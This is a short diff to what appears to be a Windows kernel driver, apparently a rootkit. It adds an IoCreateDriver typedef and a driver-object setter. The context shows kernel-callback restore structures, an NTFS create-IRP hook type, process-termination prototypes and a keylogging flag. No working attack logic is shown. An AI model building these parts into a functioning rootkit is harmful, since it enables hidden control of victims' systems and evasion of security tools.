@@ -37,6 +37,7 @@ typedef struct _KERNEL_CALLBACK_RESTORE_INFO_ARRAY {
 typedef NTSTATUS(NTAPI* NTFS_IRP_MJ_CREATE_FUNCTION)(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 
 // Function Prototypes
+typedef NTSTATUS(*IOCREATEDRIVER)(PUNICODE_STRING DriverName, PDRIVER_INITIALIZE InitializationFunction);
 typedef NTSTATUS(*ZWTERMINATEPROCESS)(IN HANDLE ProcessHandle OPTIONAL, IN NTSTATUS ExitStatus);
 typedef NTSTATUS(*ZWOPENPROCESS)(OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId);
 typedef NTSTATUS(*ZWCLOSE)(IN HANDLE Handle);
@@ -68,10 +69,16 @@ namespace BeGlobals
     bool shutdown = false;
     bool logKeys = false;
 
+    VOID
+    BeSetDriverObject(PDRIVER_OBJECT DriverObject)
+    {
+        driverObject = DriverObject;
+    }
+
     NTSTATUS
     BeInitGlobals(PDRIVER_OBJECT DriverObject)
     {
-        driverObject = DriverObject;
+        BeSetDriverObject(DriverObject);
 
         // Get base address of modules
         NtOsKrnlAddr = BeGetBaseAddrOfModule(L"ntoskrnl.exe");
